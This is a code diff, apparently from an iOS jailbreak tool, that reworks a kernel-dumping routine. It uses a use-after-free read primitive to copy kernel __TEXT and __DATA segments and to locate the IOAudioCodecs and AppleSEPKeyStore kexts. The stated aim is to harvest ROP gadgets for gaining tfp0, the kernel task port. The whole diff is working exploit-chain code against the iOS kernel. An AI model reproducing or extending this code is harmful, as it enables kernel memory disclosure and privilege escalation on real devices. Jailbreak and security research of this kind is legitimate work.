@@ -4,6 +4,8 @@
 #include <stdlib.h>             // malloc
 #include <string.h>             // memset, strerror
 
+#include <mach/vm_prot.h>       // VM_PROT_EXECUTE
+
 #include "common.h"             // ASSERT, DEBUG, PRINT_BUF, TIMER_*, MIN, ADDR, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
 #include "device.h"             // V_*, get_os_version
 #include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, vtab_t, dict_get_bytes
@@ -429,6 +431,13 @@ void uaf_read(const char *addr, char *buf, size_t len)
 #undef STR_LEN
 }
 
+// This is the MINIMUM header size - it may be bigger
+#ifdef __LP64__
+#   define MIN_HBUF_SIZE 0x2000
+#else
+#   define MIN_HBUF_SIZE 0x1000
+#endif
+
 void uaf_dump_kernel(file_t *file)
 {
     DEBUG("Dumping kernel, this will take some time...");
@@ -465,9 +474,27 @@ void uaf_dump_kernel(file_t *file)
                 case LC_SEGMENT_64:
                     {
                         mach_seg_t *seg = (mach_seg_t*)cmd;
-                        size_t size = seg->fileoff + seg->filesize;
-                        filesize = size > filesize ? size : filesize;
-                        DEBUG("Mem: " ADDR "-" ADDR " File: " ADDR "-" ADDR "     %-31s", seg->vmaddr, seg->vmaddr + seg->vmsize, seg->fileoff, seg->fileoff + seg->filesize, seg->segname);
+
+                        // On 32-bit, we dump the entire kernel - it can't be used with cl0ver anyway,
+                        // so we give people everything they might need for whatever it is they need it for.
+
+                        // On 64-bit, we only need the kernel to gain tfp0 - if people want the full kernel, they
+                        // can use kdump after that. So for arm64, only dump __TEXT, __DATA and parts of __PRELINK_TEXT.
+#ifdef __LP64__
+                        bool have = strcmp(seg->segname, "__TEXT") == 0 || strcmp(seg->segname, "__DATA") == 0 || strcmp(seg->segname, "__PRELINK_TEXT") == 0;
+                        if(have)
+                        {
+#endif
+                            size_t size = seg->fileoff + seg->filesize;
+                            filesize = size > filesize ? size : filesize;
+#ifdef __LP64__
+                        }
+#endif
+                        DEBUG("Mem: " ADDR "-" ADDR " File: " ADDR "-" ADDR "     %-15s %-15s", seg->vmaddr, seg->vmaddr + seg->vmsize, seg->fileoff, seg->fileoff + seg->filesize, seg->segname,
+#ifdef __LP64__
+                            !have ? "(skipped)" :
+#endif
+                            "");
                         for(uint32_t i = 0; i < seg->nsects; ++i)
                         {
                             mach_sec_t *sec = &( (mach_sec_t*)&seg[1] )[i];
@@ -495,8 +522,108 @@ void uaf_dump_kernel(file_t *file)
                     case LC_SEGMENT_64:
                         {
                             mach_seg_t *seg = (mach_seg_t*)cmd;
-                            DEBUG("Dumping %s...", seg->segname);
-                            uaf_read((char*)seg->vmaddr, &buf[seg->fileoff], seg->filesize);
+#ifdef __LP64__
+                            if(strcmp(seg->segname, "__TEXT") == 0 || strcmp(seg->segname, "__DATA") == 0)
+                            {
+#endif
+                                DEBUG("Dumping %s...", seg->segname);
+                                size_t off = seg->fileoff < MIN_HBUF_SIZE ? MIN_HBUF_SIZE - seg->fileoff : 0; // Avoid re-dumping the header
+                                uaf_read((char*)(seg->vmaddr + off), &buf[seg->fileoff + off], seg->filesize - off);
+#ifdef __LP64__
+                            }
+                            else if(strcmp(seg->segname, "__PRELINK_TEXT") == 0)
+                            {
+                                DEBUG("Dissecting %s...", seg->segname);
+                                // This segment is huge, so we only dump what we know we need:
+                                // - IOAudioCodecs.kext for gadget_ldp_x9_add_sp_sp_0x10
+                                // - AppleSEPKeyStore.kext for gadget_blr_x20_load_x22_x19
+                                //
+                                // We recognise the former by having a __TEXT size of 0x60000,
+                                // and the latter by having __TEXT.__const before
+                                // __TEXT.__cstring and a __TEXT size of 0x10000.
+                                size_t found = 0;
+                                uint64_t off = 0;
+                                while(off < seg->filesize)
+                                {
+                                    mach_hdr_t *kext = (mach_hdr_t*)&buf[seg->fileoff + off];
+                                    uaf_read((char*)(seg->vmaddr + off), (char*)kext, MIG_MSG_SIZE);
+                                    if(kext->magic != MH_MAGIC_64)
+                                    {
+                                        DEBUG("    Skipping " ADDR ": not a Mach-O", seg->vmaddr + off);
+                                        off += 0x4000;
+                                        continue;
+                                    }
+                                    size_t kextsize = 0;
+                                    for(mach_cmd_t *kcmd = (mach_cmd_t*)&kext[1], *kend = (mach_cmd_t*)((char*)kcmd + kext->sizeofcmds); kcmd < kend; kcmd = (mach_cmd_t*)((char*)kcmd + kcmd->cmdsize))
+                                    {
+                                        switch(kcmd->cmd)
+                                        {
+                                            case LC_SEGMENT_64:
+                                                {
+                                                    mach_seg_t *kseg = (mach_seg_t*)kcmd;
+                                                    size_t size = kseg->fileoff + kseg->filesize;
+                                                    kextsize = size > kextsize ? size : kextsize;
+                                                    if
+                                                    (
+                                                        strcmp(kseg->segname, "__TEXT") == 0 && // we only need text segments
+                                                        kext->filetype == MH_KEXT_BUNDLE        // and only for real kexts
+                                                    )
+                                                    {
+                                                        if(kseg->fileoff == 0 && kseg->filesize == 0x60000) // IOAudioCodecs
+                                                        {
+                                                            DEBUG("    Found IOAudioCodecs.kext at " ADDR, kseg->vmaddr + off);
+                                                            size_t o = kseg->fileoff < MIG_MSG_SIZE ? MIG_MSG_SIZE - kseg->fileoff : 0;
+                                                            uaf_read((char*)(seg->vmaddr + off + kseg->fileoff + o), &((char*)kext)[kseg->fileoff + o], kseg->filesize - o);
+                                                            ++found;
+                                                            goto next_kext;
+                                                        }
+                                                        else if(kseg->fileoff == 0 && kseg->filesize == 0x10000)
+                                                        {
+                                                            bool saw_const = false;
+                                                            // iterate over sections
+                                                            struct section_64 *ksec = (struct section_64*)(kseg + 1);
+                                                            for(size_t i = 0; i < kseg->nsects; ++i)
+                                                            {
+                                                                if(strcmp(ksec[i].sectname, "__const") == 0)
+                                                                {
+                                                                    saw_const = true;
+                                                                }
+                                                                else if(saw_const && strcmp(ksec[i].sectname, "__cstring") == 0) // AppleSEPKeyStore
+                                                                {
+                                                                    DEBUG("    Found AppleSEPKeyStore.kext at " ADDR, kseg->vmaddr + off);
+                                                                    size_t o = kseg->fileoff < MIG_MSG_SIZE ? MIG_MSG_SIZE - kseg->fileoff : 0;
+                                                                    uaf_read((char*)(seg->vmaddr + off + kseg->fileoff + o), &((char*)kext)[kseg->fileoff + o], kseg->filesize - o);
+                                                                    ++found;
+                                                                    goto next_kext;
+                                                                }
+                                                            }
+                                                        }
+                                                    }
+                                                }
+                                                break;
+                                        }
+                                    }
+                                    DEBUG("    Skipping kext at " ADDR, seg->vmaddr + off);
+                                    next_kext:;
+                                    if(found >= 2)
+                                    {
+                                        DEBUG("    Found all required kexts, skipping the rest");
+                                        break;
+                                    }
+                                    kextsize = ((kextsize + 0x3fff) >> 14) << 14; // Round up to multiples of 0x4000
+                                    off += kextsize;
+                                }
+                                if(found < 2)
+                                {
+                                    THROW("Didn't find all required kexts");
+                                }
+                            }
+                            else // on arm64, ignore all other segments
+                            {
+                                DEBUG("Skipping %s...", seg->segname);
+                                break;
+                            }
+#endif
                         }
                     case LC_UUID:
                     case LC_UNIXTHREAD:
